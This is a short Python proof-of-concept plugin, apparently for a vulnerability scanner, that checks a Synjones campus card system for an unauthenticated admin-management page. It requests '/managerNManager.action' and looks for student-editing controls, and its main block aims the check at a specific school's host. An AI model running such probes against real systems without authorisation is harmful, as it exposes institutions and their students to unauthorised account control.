#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
POC Name  :  金融化一卡通系统越权添加管理员
Author    :  a
mail      :  a@lcx.cc
Referer   : http://www.wooyun.org/bugs/wooyun-2015-095962
"""

import urlparse
def assign(service, arg):
    if service == 'synjones_school':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    payload = '/managerNManager.action'
    url = arg + payload
    code, head, res, errcode, _ = curl.curl('"%s"' % url)
    if code == 200 and  'createStu' in res  and 'editStu' in res and 'deleteStu' in res:
        security_info(url)
        

if __name__ == '__main__':
    from dummy import *
    audit(assign('synjones_school','http://ecard.sdwz.cn/')[1])
